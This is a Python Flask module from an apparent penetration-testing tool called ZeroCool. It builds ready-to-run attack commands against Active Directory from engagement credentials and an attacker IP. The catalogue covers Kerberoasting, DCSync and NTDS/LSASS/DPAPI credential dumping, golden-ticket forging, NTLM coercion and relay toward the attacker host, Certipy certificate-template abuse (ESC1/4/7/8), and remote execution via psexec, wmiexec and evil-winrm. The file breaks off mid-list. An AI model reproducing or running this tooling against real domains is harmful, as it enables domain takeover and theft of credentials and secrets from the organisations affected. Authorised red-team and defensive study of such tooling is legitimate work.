"""Active Directory module for ZeroCool.

A data-driven command catalog covering the AD attack surface:

  * Enumeration         — NetExec (SMB/LDAP), impacket lookupsid/GetADUsers,
                          rpcclient, enum4linux-ng, ldapsearch
  * Kerberos & creds    — AS-REP roast, Kerberoast, getTGT, S4U (getST),
                          ticketer (golden/silver), addcomputer, rbcd,
                          changepasswd
  * Secrets & dumping   — secretsdump (remote), DCSync, SAM/LSA/NTDS via nxc
  * BloodHound          — bloodhound-python, nxc --bloodhound
  * Lateral movement    — psexec / smbexec / wmiexec / atexec / dcomexec,
                          evil-winrm
  * Coercion / relay    — Coercer, PetitPotam, PrinterBug, DFSCoerce,
                          ShadowCoerce, ntlmrelayx (SMB/LDAP-RBCD/ADCS),
                          Responder
  * ADCS / certificates — Certipy find, req (ESC1), auth, shadow creds,
                          relay (ESC8), ca (ESC7), template (ESC4)
  * Checks              — zerologon, nopac, printnightmare, spooler, ms17-010

Each action is a small build(ctx) -> command string. The context is assembled
from the engagement (domain / DC / attacker IP / interface / creds) plus a
selected credential and per-action inputs. Commands are previewed live and run
through the shared runner so output streams to the terminal and the Activity Log.
"""

from __future__ import annotations

import shlex

from flask import Blueprint, jsonify, render_template, request

import storage
import tools

ad_bp = Blueprint("ad", __name__)


# ---------------------------------------------------------------------------
# context + auth helpers
# ---------------------------------------------------------------------------

def _q(value: str) -> str:
    """shlex.quote, but leave empty strings as empty (not '')."""
    return shlex.quote(value) if value else ""


def cmd(*parts: str) -> str:
    """Join non-empty parts with single spaces."""
    return " ".join(p for p in parts if p)


def base_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split(".") if p) if domain else ""


def build_context(params: dict, eng: dict) -> dict:
    creds = eng.get("credentials") or []
    idx = params.get("cred_index", "0")
    try:
        idx = int(idx)
    except (TypeError, ValueError):
        idx = -1
    cred = creds[idx] if 0 <= idx < len(creds) else {}

    # Per-request overrides take precedence over the selected credential.
    user = (params.get("o_user") or cred.get("username") or "").strip()
    password = params.get("o_pass") if params.get("o_pass") is not None else cred.get("password", "")
    password = (password or "")
    nthash = (params.get("o_hash") or cred.get("ntlm_hash") or "").strip()
    domain = (params.get("o_domain") or eng.get("domain") or "").strip()

    dc_ip = (eng.get("dc_ip") or "").strip()
    target = (params.get("target") or "").strip() or dc_ip

    return {
        "domain": domain,
        "dc_ip": dc_ip,
        "dc_host": (eng.get("dc_hostname") or "").strip(),
        "attacker_ip": (eng.get("attacker_ip") or "").strip(),
        "interface": (eng.get("interface") or "").strip(),
        "loot": (eng.get("output_dir") or "").strip(),
        "user": user,
        "password": password,
        "nthash": nthash,
        "kerberos": str(params.get("kerberos", "")).lower() in ("1", "true", "on", "yes"),
        "proxychains": str(params.get("proxychains", "")).lower() in ("1", "true", "on", "yes"),
        "target": target,
        "base_dn": base_dn(domain),
        "p": params,  # raw action inputs
    }


def principal(ctx: dict) -> str:
    return f"{ctx['domain']}/{ctx['user']}" if ctx["domain"] else ctx["user"]


def imp_auth(ctx: dict, target: str | None = None, with_secret: bool = True):
    """Return (auth_token, hash_flag, kerb_flag) for an impacket invocation.

    auth_token is a shell-safe 'domain/user[:password]' optionally suffixed with
    '@target'. Hashes / kerberos are returned as separate flags.
    """
    princ = principal(ctx)
    hash_flag = ""
    kerb_flag = ""
    if ctx["kerberos"]:
        core = princ
        kerb_flag = "-k -no-pass"
    elif ctx["nthash"] and not ctx["password"]:
        core = princ
        hash_flag = f"-hashes :{ctx['nthash']}"
    elif with_secret:
        core = f"{princ}:{ctx['password']}"
    else:
        core = princ
    token = _q(core)
    if target:
        token = f"{token}@{target}"
    return token, hash_flag, kerb_flag


def nxc_secret(ctx: dict) -> str:
    parts = []
    if ctx["user"]:
        parts.append(f"-u {_q(ctx['user'])}")
    if ctx["nthash"] and not ctx["password"]:
        parts.append(f"-H {_q(ctx['nthash'])}")
    else:
        parts.append(f"-p {_q(ctx['password'])}")
    if ctx["domain"]:
        parts.append(f"-d {_q(ctx['domain'])}")
    if ctx["kerberos"]:
        parts.append("-k")
    return " ".join(parts)


def certipy_secret(ctx: dict) -> str:
    if ctx["nthash"] and not ctx["password"]:
        return f"-hashes :{ctx['nthash']}"
    if ctx["password"]:
        return f"-p {_q(ctx['password'])}"
    return ""


def upn(ctx: dict) -> str:
    return f"{ctx['user']}@{ctx['domain']}" if ctx["domain"] else ctx["user"]


def dcip_flag(ctx: dict) -> str:
    return f"-dc-ip {ctx['dc_ip']}" if ctx["dc_ip"] else ""


def pv(ctx: dict, name: str, default: str = "") -> str:
    """Action input value with default."""
    val = (ctx["p"].get(name) or "").strip()
    return val or default


# ---------------------------------------------------------------------------
# build functions
# ---------------------------------------------------------------------------

# --- Enumeration ---
def b_nxc_smb(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--shares --users --groups")

def b_nxc_passpol(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--pass-pol")

def b_nxc_loggedon(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--loggedon-users")

def b_nxc_spider(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "-M spider_plus")

def b_nxc_ldap(ctx):
    return cmd("nxc ldap", ctx["target"], nxc_secret(ctx), "--users --groups")

def b_lookupsid(ctx):
    auth, h, k = imp_auth(ctx, ctx["target"])
    return cmd("impacket-lookupsid", auth, h, k, dcip_flag(ctx))

def b_getadusers(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-GetADUsers", auth, h, k, dcip_flag(ctx), "-all")

def b_rpcclient(ctx):
    return cmd("rpcclient -U", f"{_q(ctx['user'] + '%' + ctx['password'])}", ctx["target"],
               "-c", _q(pv(ctx, "rpc_cmd", "enumdomusers")))

def b_enum4linux(ctx):
    return cmd("enum4linux-ng -A", ctx["target"])

def b_ldapsearch(ctx):
    bind = f"{ctx['user']}@{ctx['domain']}" if ctx["domain"] else ctx["user"]
    return cmd("ldapsearch -x -H", f"ldap://{ctx['target']}",
               "-D", _q(bind), "-w", _q(ctx["password"]),
               "-b", _q(pv(ctx, "base_dn", ctx["base_dn"])),
               _q(pv(ctx, "ldap_filter", "")))

# --- Kerberos & credentials ---
def b_asrep(ctx):
    out = pv(ctx, "outfile", "asrep.txt")
    userfile = pv(ctx, "userfile", "users.txt")
    return cmd(f"impacket-GetNPUsers {ctx['domain']}/", dcip_flag(ctx),
               "-no-pass -usersfile", _q(userfile),
               "-format hashcat -outputfile", _q(out))

def b_kerberoast(ctx):
    auth, h, k = imp_auth(ctx)
    out = pv(ctx, "outfile", "kerberoast.txt")
    return cmd("impacket-GetUserSPNs", auth, h, k, dcip_flag(ctx),
               "-request -outputfile", _q(out))

def b_gettgt(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-getTGT", auth, h, k, dcip_flag(ctx))

def b_getst(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-getST", auth, h, k, dcip_flag(ctx),
               "-spn", _q(pv(ctx, "spn", "cifs/target.domain")),
               "-impersonate", _q(pv(ctx, "impersonate", "Administrator")))

def b_addcomputer(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-addcomputer", auth, h, k, dcip_flag(ctx),
               "-computer-name", _q(pv(ctx, "compname", "ZEROCOOL$")),
               "-computer-pass", _q(pv(ctx, "comppass", "Password123!")),
               "-method LDAPS")

def b_rbcd(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-rbcd", auth, h, k, dcip_flag(ctx),
               "-delegate-from", _q(pv(ctx, "delegate_from", "ZEROCOOL$")),
               "-delegate-to", _q(pv(ctx, "delegate_to", "DC01$")),
               "-action write")

def b_changepasswd(ctx):
    auth, h, k = imp_auth(ctx, ctx["dc_ip"])
    return cmd("impacket-changepasswd", auth, h, k,
               "-newpass", _q(pv(ctx, "newpass", "NewPassw0rd!")),
               "-altuser", _q(pv(ctx, "altuser", "")) or "",
               "-reset" if pv(ctx, "reset") else "")

def b_ticketer(ctx):
    return cmd("impacket-ticketer",
               "-nthash", _q(pv(ctx, "krbtgt_hash", "<KRBTGT_NTHASH>")),
               "-domain-sid", _q(pv(ctx, "domain_sid", "<DOMAIN_SID>")),
               "-domain", _q(ctx["domain"]),
               _q(pv(ctx, "ticket_user", "Administrator")))

# --- Secrets & dumping ---
def b_secretsdump(ctx):
    auth, h, k = imp_auth(ctx, ctx["target"])
    return cmd("impacket-secretsdump", auth, h, k, dcip_flag(ctx))

def b_dcsync(ctx):
    tgt = ctx["dc_host"] or ctx["dc_ip"] or ctx["target"]
    auth, h, k = imp_auth(ctx, tgt)
    return cmd("impacket-secretsdump", auth, h, k, dcip_flag(ctx),
               "-just-dc", ("-just-dc-user " + _q(pv(ctx, "just_user", ""))) if pv(ctx, "just_user") else "")

def b_nxc_sam(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--sam")

def b_nxc_lsa(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--lsa")

def b_nxc_ntds(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "--ntds")

# --- BloodHound ---
def b_bloodhound_py(ctx):
    if ctx["nthash"] and not ctx["password"]:
        secret = f"--hashes :{ctx['nthash']}"
    else:
        secret = f"-p {_q(ctx['password'])}"
    return cmd("bloodhound-python", "-d", _q(ctx["domain"]), "-u", _q(ctx["user"]), secret,
               "-dc", _q(ctx["dc_host"] or ctx["dc_ip"]), "-ns", ctx["dc_ip"],
               "-c All --zip", "-k" if ctx["kerberos"] else "")

def b_nxc_bloodhound(ctx):
    return cmd("nxc ldap", ctx["target"], nxc_secret(ctx),
               "--bloodhound -c all --dns-server", ctx["dc_ip"])

# --- Lateral movement ---
def _exec(tool):
    def build(ctx):
        auth, h, k = imp_auth(ctx, ctx["target"])
        command = _q(pv(ctx, "command", ""))
        return cmd(f"impacket-{tool}", auth, h, k, dcip_flag(ctx), command)
    return build

def b_evilwinrm(ctx):
    secret = f"-H {_q(ctx['nthash'])}" if (ctx["nthash"] and not ctx["password"]) else f"-p {_q(ctx['password'])}"
    return cmd("evil-winrm -i", ctx["target"], "-u", _q(ctx["user"]), secret)

# --- Coercion / relay ---
def b_coercer(ctx):
    secret = f"-H :{ctx['nthash']}" if (ctx["nthash"] and not ctx["password"]) else f"-p {_q(ctx['password'])}"
    return cmd("coercer coerce", "-t", ctx["target"], "-l", ctx["attacker_ip"],
               "-u", _q(ctx["user"]), secret, "-d", _q(ctx["domain"]))

def b_petitpotam(ctx):
    secret = f"-hashes :{ctx['nthash']}" if (ctx["nthash"] and not ctx["password"]) else f"-p {_q(ctx['password'])}"
    return cmd("petitpotam.py", "-u", _q(ctx["user"]), secret, "-d", _q(ctx["domain"]),
               ctx["attacker_ip"], ctx["target"])

def b_printerbug(ctx):
    auth, h, k = imp_auth(ctx, ctx["target"])
    return cmd("printerbug.py", auth, h, ctx["attacker_ip"])

def b_dfscoerce(ctx):
    secret = f"-hashes :{ctx['nthash']}" if (ctx["nthash"] and not ctx["password"]) else f"-p {_q(ctx['password'])}"
    return cmd("dfscoerce.py", "-u", _q(ctx["user"]), secret, "-d", _q(ctx["domain"]),
               ctx["attacker_ip"], ctx["target"])

def b_shadowcoerce(ctx):
    secret = f"-hashes :{ctx['nthash']}" if (ctx["nthash"] and not ctx["password"]) else f"-p {_q(ctx['password'])}"
    return cmd("shadowcoerce.py", "-u", _q(ctx["user"]), secret, "-d", _q(ctx["domain"]),
               ctx["attacker_ip"], ctx["target"])

def b_responder(ctx):
    return cmd("responder -I", ctx["interface"] or "eth0", pv(ctx, "extra", "-wv"))

def b_relay_smb(ctx):
    return cmd("impacket-ntlmrelayx -smb2support -t", _q(pv(ctx, "relay_target", "smb://TARGET")),
               pv(ctx, "extra", ""))

def b_relay_ldap_rbcd(ctx):
    return cmd("impacket-ntlmrelayx -smb2support -t", f"ldap://{ctx['dc_ip']}",
               "--delegate-access --no-dump --no-da --no-acl")

def b_relay_adcs(ctx):
    return cmd("impacket-ntlmrelayx -smb2support -t",
               f"http://{pv(ctx, 'ca_host', 'CA_HOST')}/certsrv/certfnsh.asp",
               "--adcs --template", _q(pv(ctx, "template", "DomainController")))

# --- ADCS / Certipy ---
def b_certipy_find(ctx):
    return cmd("certipy find -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-stdout -vulnerable -enabled")

def b_certipy_find_bh(ctx):
    return cmd("certipy find -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-bloodhound")

def b_certipy_req(ctx):
    return cmd("certipy req -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-ca", _q(pv(ctx, "ca", "CA-NAME")),
               "-template", _q(pv(ctx, "template", "User")),
               ("-upn " + _q(pv(ctx, "alt_upn", ""))) if pv(ctx, "alt_upn") else "")

def b_certipy_auth(ctx):
    return cmd("certipy auth -pfx", _q(pv(ctx, "pfx", "administrator.pfx")), dcip_flag(ctx))

def b_certipy_shadow(ctx):
    return cmd("certipy shadow auto -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-account", _q(pv(ctx, "account", "DC01$")))

def b_certipy_relay(ctx):
    return cmd("certipy relay -target", _q(pv(ctx, "ca_host", "CA_HOST")),
               "-template", _q(pv(ctx, "template", "DomainController")))

def b_certipy_ca(ctx):
    return cmd("certipy ca -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-ca", _q(pv(ctx, "ca", "CA-NAME")),
               "-add-officer", _q(ctx["user"]))

def b_certipy_template(ctx):
    return cmd("certipy template -u", _q(upn(ctx)), certipy_secret(ctx), dcip_flag(ctx),
               "-template", _q(pv(ctx, "template", "User")),
               "-write-default-configuration")

# --- Checks ---
def b_zerologon(ctx):
    return cmd("nxc smb", ctx["dc_ip"], "-u '' -p '' -M zerologon")

def b_nopac(ctx):
    return cmd("nxc smb", ctx["dc_ip"], nxc_secret(ctx), "-M nopac")

def b_printnightmare(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "-M printnightmare")

def b_spooler(ctx):
    return cmd("nxc smb", ctx["target"], nxc_secret(ctx), "-M spooler")

def b_ms17(ctx):
    return cmd("nxc smb", ctx["target"], "-M ms17-010")


# --- NetExec (nxc) extended ---
def _nxc(proto, ctx, *rest):
    return cmd(f"nxc {proto}", ctx["target"], nxc_secret(ctx), *rest)

# dumping / secrets
def b_nxc_dpapi(ctx): return _nxc("smb", ctx, "--dpapi")
def b_nxc_dpapi_cookies(ctx): return _nxc("smb", ctx, "--dpapi cookies")
def b_nxc_lsassy(ctx): return _nxc("smb", ctx, "-M lsassy")
def b_nxc_nanodump(ctx): return _nxc("smb", ctx, "-M nanodump")
def b_nxc_gpp(ctx): return _nxc("smb", ctx, "-M gpp_password -M gpp_autologin")
def b_nxc_laps(ctx): return _nxc("smb", ctx, "--laps")
def b_nxc_veeam(ctx): return _nxc("smb", ctx, "-M veeam")
def b_nxc_mremoteng(ctx): return _nxc("smb", ctx, "-M mremoteng")
def b_nxc_keepass(ctx): return _nxc("smb", ctx, "-M keepass_discover")
def b_nxc_wifi(ctx): return _nxc("smb", ctx, "-M wireless")

# enumeration
def b_nxc_rid(ctx): return _nxc("smb", ctx, "--rid-brute")
def b_nxc_sessions(ctx): return _nxc("smb", ctx, "--sessions")
def b_nxc_disks(ctx): return _nxc("smb", ctx, "--disks")
def b_nxc_computers(ctx): return _nxc("smb", ctx, "--computers")
def b_nxc_localgroups(ctx): return _nxc("smb", ctx, "--local-groups")
def b_nxc_enum_av(ctx): return _nxc("smb", ctx, "-M enum_av")
def b_nxc_gmsa(ctx): return _nxc("ldap", ctx, "--gmsa")
def b_nxc_passnotreq(ctx): return _nxc("ldap", ctx, "--password-not-required")
def b_nxc_userdesc(ctx): return _nxc("ldap", ctx, "-M get-desc-users")
def b_nxc_trusts(ctx): return _nxc("ldap", ctx, "-M enum_trusts")
def b_nxc_maq(ctx): return _nxc("ldap", ctx, "-M maq")
def b_nxc_subnets(ctx): return _nxc("ldap", ctx, "-M subnets")
def b_nxc_daclread(ctx): return _nxc("ldap", ctx, "-M daclread")

# kerberos via ldap
def b_nxc_asrep_ldap(ctx): return _nxc("ldap", ctx, "--asreproast asreproast.txt")
def b_nxc_kerb_ldap(ctx): return _nxc("ldap", ctx, "--kerberoasting kerberoasting.txt")
def b_nxc_adcs(ctx): return _nxc("ldap", ctx, "-M adcs")

# coercion / checks
def b_nxc_webdav(ctx): return _nxc("smb", ctx, "-M webdav")
def b_nxc_coerce(ctx): return _nxc("smb", ctx, "-M coerce_plus")
def b_nxc_ntlmv1(ctx): return _nxc("smb", ctx, "-M ntlmv1")
def b_nxc_runasppl(ctx): return _nxc("smb", ctx, "-M runasppl")
def b_nxc_timeroast(ctx): return cmd("nxc smb", ctx["dc_ip"], "-M timeroast")

# execution / files
def b_nxc_exec(ctx): return _nxc("smb", ctx, "-x", _q(pv(ctx, "command", "whoami")))
def b_nxc_exec_ps(ctx): return _nxc("smb", ctx, "-X", _q(pv(ctx, "command", "$PSVersionTable")))
def b_nxc_winrm_exec(ctx): return _nxc("winrm", ctx, "-x", _q(pv(ctx, "command", "whoami")))
def b_nxc_mssql_query(ctx): return _nxc("mssql", ctx, "-q", _q(pv(ctx, "query", "SELECT @@version")))
def b_nxc_mssql_exec(ctx): return _nxc("mssql", ctx, "-x", _q(pv(ctx, "command", "whoami")))
def b_nxc_putfile(ctx):
    return _nxc("smb", ctx, "--put-file", _q(pv(ctx, "lfile", "/tmp/file")),
                _q(pv(ctx, "rfile", "\\\\Windows\\\\Temp\\\\file")))
def b_nxc_getfile(ctx):
    return _nxc("smb", ctx, "--get-file", _q(pv(ctx, "rfile", "\\\\Windows\\\\Temp\\\\file")),
                _q(pv(ctx, "lfile", "/tmp/file")))


# --- AD checks (vulns / misconfigurations) ---
def b_nxc_smbghost(ctx): return cmd("nxc smb", ctx["target"], "-M smbghost")
def b_nxc_sccm(ctx): return _nxc("smb", ctx, "-M sccm")
def b_nxc_ldapchecker(ctx): return _nxc("ldap", ctx, "-M ldap-checker")
def b_nxc_relaylist(ctx): return _nxc("smb", ctx, "--gen-relay-list relay_targets.txt")
def b_nxc_wcc(ctx): return _nxc("smb", ctx, "-M wcc")
def b_nxc_unconstrained(ctx): return _nxc("ldap", ctx, "--trusted-for-delegation")
def b_nxc_admincount(ctx): return _nxc("ldap", ctx, "--admin-count")
def b_nxc_petitpotam(ctx): return _nxc("smb", ctx, "-M petitpotam")
def b_nxc_dfscoerce(ctx): return _nxc("smb", ctx, "-M dfscoerce")
def b_nxc_smbsigning(ctx): return _nxc("smb", ctx, "-M smbsigning")
def b_nxc_maq_check(ctx): return _nxc("ldap", ctx, "-M maq")

def b_find_delegation(ctx):
    auth, h, k = imp_auth(ctx)
    return cmd("impacket-findDelegation", auth, h, k, dcip_flag(ctx))

def b_pre2k(ctx):
    return cmd("pre2k unauth -d", _q(ctx["domain"]), dcip_flag(ctx),
               "-inputfile", _q(pv(ctx, "inputfile", "computers.txt")),
               "-outputfile pre2k_valid.txt")

def b_goldenpac(ctx):  # MS14-068
    auth, h, k = imp_auth(ctx, ctx["target"])
    return cmd("impacket-goldenPac", auth, h, k, dcip_flag(ctx))


# ---------------------------------------------------------------------------
# catalog
# ---------------------------------------------------------------------------
# Each: id, cat, label, desc, build, inputs[], requires[]
# inputs: {name, label, placeholder, default}
T = lambda name, label, ph="", default="": {"name": name, "label": label, "placeholder": ph, "default": default}

ACTIONS = [
    # Enumeration
    dict(id="nxc_smb", cat="Enumeration", label="NetExec SMB overview",
         desc="Shares, users and groups over SMB.", build=b_nxc_smb, requires=["user"]),
    dict(id="nxc_passpol", cat="Enumeration", label="Password policy",
         desc="Domain password policy via SMB.", build=b_nxc_passpol, requires=["user"]),
    dict(id="nxc_loggedon", cat="Enumeration", label="Logged-on users",
         desc="Sessions on a host (needs admin).", build=b_nxc_loggedon, requires=["user"]),
    dict(id="nxc_spider", cat="Enumeration", label="Spider shares",
         desc="Recursively list readable share contents.", build=b_nxc_spider, requires=["user"]),
    dict(id="nxc_ldap", cat="Enumeration", label="NetExec LDAP enum",
         desc="Users and groups over LDAP.", build=b_nxc_ldap, requires=["user"]),
    dict(id="lookupsid", cat="Enumeration", label="lookupsid (RID brute)",
         desc="impacket-lookupsid SID/RID enumeration.", build=b_lookupsid, requires=["user"]),
    dict(id="getadusers", cat="Enumeration", label="GetADUsers",
         desc="impacket-GetADUsers — all domain users + lastlogon.", build=b_getadusers, requires=["user"]),
    dict(id="rpcclient", cat="Enumeration", label="rpcclient",
         desc="Run an rpcclient command (default enumdomusers).", build=b_rpcclient,
         inputs=[T("rpc_cmd", "rpcclient command", "enumdomusers", "enumdomusers")], requires=[]),
    dict(id="enum4linux", cat="Enumeration", label="enum4linux-ng",
         desc="Full enum4linux-ng sweep of a host.", build=b_enum4linux, requires=[]),
    dict(id="ldapsearch", cat="Enumeration", label="ldapsearch",
         desc="Raw LDAP query with an optional filter.", build=b_ldapsearch,
         inputs=[T("base_dn", "Base DN", "DC=corp,DC=local"),
                 T("ldap_filter", "Filter", "(objectClass=user)")], requires=["user"]),

    # Kerberos & credentials
    dict(id="asrep", cat="Kerberos & Creds", label="AS-REP roast",
         desc="impacket-GetNPUsers against a userlist (no creds needed).", build=b_asrep,
         inputs=[T("userfile", "Users file", "users.txt", "users.txt"),
                 T("outfile", "Output", "asrep.txt", "asrep.txt")], requires=["dc_ip"]),
    dict(id="kerberoast", cat="Kerberos & Creds", label="Kerberoast",
         desc="impacket-GetUserSPNs -request for all SPNs.", build=b_kerberoast,
         inputs=[T("outfile", "Output", "kerberoast.txt", "kerberoast.txt")], requires=["user", "dc_ip"]),
    dict(id="gettgt", cat="Kerberos & Creds", label="getTGT",
         desc="Request a TGT and save a .ccache.", build=b_gettgt, requires=["user", "dc_ip"]),
    dict(id="getst", cat="Kerberos & Creds", label="getST (S4U)",
         desc="Constrained-delegation / S4U service ticket.", build=b_getst,
         inputs=[T("spn", "Target SPN", "cifs/srv.corp.local"),
                 T("impersonate", "Impersonate", "Administrator", "Administrator")],
         requires=["user", "dc_ip"]),
    dict(id="addcomputer", cat="Kerberos & Creds", label="addcomputer",
         desc="Create a machine account (MachineAccountQuota).", build=b_addcomputer,
         inputs=[T("compname", "Computer name", "ZEROCOOL$", "ZEROCOOL$"),
                 T("comppass", "Computer pass", "Password123!", "Password123!")],
         requires=["user", "dc_ip"]),
    dict(id="rbcd", cat="Kerberos & Creds", label="rbcd (write)",
         desc="Configure resource-based constrained delegation.", build=b_rbcd,
         inputs=[T("delegate_from", "Delegate FROM", "ZEROCOOL$", "ZEROCOOL$"),
                 T("delegate_to", "Delegate TO", "DC01$", "DC01$")], requires=["user", "dc_ip"]),
    dict(id="changepasswd", cat="Kerberos & Creds", label="changepasswd",
         desc="Change/reset an account password.", build=b_changepasswd,
         inputs=[T("newpass", "New password", "NewPassw0rd!", "NewPassw0rd!"),
                 T("altuser", "Target user (alt)", "victim"),
                 T("reset", "Force reset (1/blank)", "")], requires=["user", "dc_ip"]),
    dict(id="ticketer", cat="Kerberos & Creds", label="ticketer (golden)",
         desc="Forge a golden/silver ticket from the krbtgt hash.", build=b_ticketer,
         inputs=[T("krbtgt_hash", "krbtgt NT hash", "<KRBTGT_NTHASH>"),
                 T("domain_sid", "Domain SID", "S-1-5-21-..."),
                 T("ticket_user", "Ticket user", "Administrator", "Administrator")], requires=["domain"]),

    # Secrets & dumping
    dict(id="secretsdump", cat="Secrets & Dumping", label="secretsdump (remote)",
         desc="Dump SAM/LSA/cached secrets from a host.", build=b_secretsdump, requires=["user"]),
    dict(id="dcsync", cat="Secrets & Dumping", label="DCSync (-just-dc)",
         desc="Replicate NTDS hashes from the DC.", build=b_dcsync,
         inputs=[T("just_user", "Just one user (opt)", "krbtgt")], requires=["user"]),
    dict(id="nxc_sam", cat="Secrets & Dumping", label="nxc --sam",
         desc="Dump the SAM database via NetExec.", build=b_nxc_sam, requires=["user"]),
    dict(id="nxc_lsa", cat="Secrets & Dumping", label="nxc --lsa",
         desc="Dump LSA secrets via NetExec.", build=b_nxc_lsa, requires=["user"]),
    dict(id="nxc_ntds", cat="Secrets & Dumping", label="nxc --ntds",
         desc="Dump NTDS.dit via NetExec (against DC).", build=b_nxc_ntds, requires=["user"]),

    # BloodHound
    dict(id="bloodhound_py", cat="BloodHound", label="bloodhound-python",
         desc="Collect all BloodHound data and zip it.", build=b_bloodhound_py, requires=["user", "domain", "dc_ip"]),
    dict(id="nxc_bloodhound", cat="BloodHound", label="nxc --bloodhound",
         desc="NetExec LDAP BloodHound collection.", build=b_nxc_bloodhound, requires=["user", "dc_ip"]),

    # Lateral movement
    dict(id="psexec", cat="Lateral Movement", label="psexec",
         desc="SYSTEM shell via SMB service (impacket-psexec).", build=_exec("psexec"),
         inputs=[T("command", "Command (optional)", "whoami")], requires=["user"]),
    dict(id="smbexec", cat="Lateral Movement", label="smbexec",
         desc="Semi-interactive exec via SMB.", build=_exec("smbexec"),
         inputs=[T("command", "Command (optional)", "whoami")], requires=["user"]),
    dict(id="wmiexec", cat="Lateral Movement", label="wmiexec",
         desc="Exec via WMI (impacket-wmiexec).", build=_exec("wmiexec"),
         inputs=[T("command", "Command (optional)", "whoami")], requires=["user"]),
    dict(id="atexec", cat="Lateral Movement", label="atexec",
         desc="Exec via the task scheduler.", build=_exec("atexec"),
         inputs=[T("command", "Command", "whoami", "whoami")], requires=["user"]),
    dict(id="dcomexec", cat="Lateral Movement", label="dcomexec",
         desc="Exec via DCOM.", build=_exec("dcomexec"),
         inputs=[T("command", "Command (optional)", "whoami")], requires=["user"]),
    dict(id="evilwinrm", cat="Lateral Movement", label="evil-winrm",
         desc="Interactive WinRM shell.", build=b_evilwinrm, requires=["user"]),

    # Coercion / relay
    dict(id="coercer", cat="Coercion / Relay", label="Coercer (all methods)",
         desc="Fan out every coercion method at a target.", build=b_coercer, requires=["attacker_ip", "user"]),
    dict(id="petitpotam", cat="Coercion / Relay", label="PetitPotam (MS-EFSR)",
         desc="EfsRpcOpenFileRaw / MS-EFSR coercion.", build=b_petitpotam, requires=["attacker_ip"]),
    dict(id="printerbug", cat="Coercion / Relay", label="PrinterBug (MS-RPRN)",
         desc="Spooler RpcRemoteFindFirstPrinterChangeNotification.", build=b_printerbug, requires=["attacker_ip", "user"]),
    dict(id="dfscoerce", cat="Coercion / Relay", label="DFSCoerce (MS-DFSNM)",
         desc="NetrDfsAddStdRoot coercion.", build=b_dfscoerce, requires=["attacker_ip", "user"]),
    dict(id="shadowcoerce", cat="Coercion / Relay", label="ShadowCoerce (MS-FSRVP)",
         desc="VSS / MS-FSRVP coercion.", build=b_shadowcoerce, requires=["attacker_ip", "user"]),
    dict(id="responder", cat="Coercion / Relay", label="Responder",
         desc="Poison LLMNR/NBT-NS/mDNS on the interface.", build=b_responder,
         inputs=[T("extra", "Extra flags", "-wv", "-wv")], requires=["interface"]),
    dict(id="relay_smb", cat="Coercion / Relay", label="ntlmrelayx → SMB",
         desc="Relay captured auth to an SMB target.", build=b_relay_smb,
         inputs=[T("relay_target", "Relay target", "smb://10.10.0.20"),
                 T("extra", "Extra", "-c whoami")], requires=[]),
    dict(id="relay_ldap_rbcd", cat="Coercion / Relay", label="ntlmrelayx → LDAP (RBCD)",
         desc="Relay to LDAP for resource-based delegation.", build=b_relay_ldap_rbcd, requires=["dc_ip"]),
    dict(id="relay_adcs", cat="Coercion / Relay", label="ntlmrelayx → ADCS (ESC8)",
         desc="Relay machine auth to the CA web enrollment.", build=b_relay_adcs,
         inputs=[T("ca_host", "CA host", "10.10.0.30"),
                 T("template", "Template", "DomainController", "DomainController")], requires=[]),

    # ADCS / Certificates
    dict(id="certipy_find", cat="ADCS / Certificates", label="Certipy find (vuln)",
         desc="Enumerate CAs/templates, flag ESC1-ESC8.", build=b_certipy_find, requires=["user"]),
    dict(id="certipy_find_bh", cat="ADCS / Certificates", label="Certipy find → BloodHound",
         desc="Certipy output for BloodHound ingest.", build=b_certipy_find_bh, requires=["user"]),
    dict(id="certipy_req", cat="ADCS / Certificates", label="Certipy req (ESC1)",
         desc="Request a cert, optional alt UPN for ESC1.", build=b_certipy_req,
         inputs=[T("ca", "CA name", "corp-CA-CA"),
                 T("template", "Template", "User", "User"),
                 T("alt_upn", "Alt UPN (ESC1)", "administrator@corp.local")], requires=["user"]),
    dict(id="certipy_auth", cat="ADCS / Certificates", label="Certipy auth (PFX)",
         desc="Authenticate with a .pfx → NT hash / TGT.", build=b_certipy_auth,
         inputs=[T("pfx", "PFX file", "administrator.pfx", "administrator.pfx")], requires=["dc_ip"]),
    dict(id="certipy_shadow", cat="ADCS / Certificates", label="Certipy shadow creds",
         desc="Key Credential Link (shadow credentials) on an account.", build=b_certipy_shadow,
         inputs=[T("account", "Target account", "DC01$")], requires=["user"]),
    dict(id="certipy_relay", cat="ADCS / Certificates", label="Certipy relay (ESC8)",
         desc="Certipy's built-in relay to web enrollment.", build=b_certipy_relay,
         inputs=[T("ca_host", "CA host", "10.10.0.30"),
                 T("template", "Template", "DomainController", "DomainController")], requires=[]),
    dict(id="certipy_ca", cat="ADCS / Certificates", label="Certipy ca (ESC7)",
         desc="Abuse CA manager rights (add officer).", build=b_certipy_ca,
         inputs=[T("ca", "CA name", "corp-CA-CA")], requires=["user"]),
    dict(id="certipy_template", cat="ADCS / Certificates", label="Certipy template (ESC4)",
         desc="Overwrite a template config (ESC4).", build=b_certipy_template,
         inputs=[T("template", "Template", "User", "User")], requires=["user"]),

    # Checks
    dict(id="zerologon", cat="Checks", label="Zerologon (CVE-2020-1472)",
         desc="NetExec zerologon check (non-destructive).", build=b_zerologon, requires=["dc_ip"]),
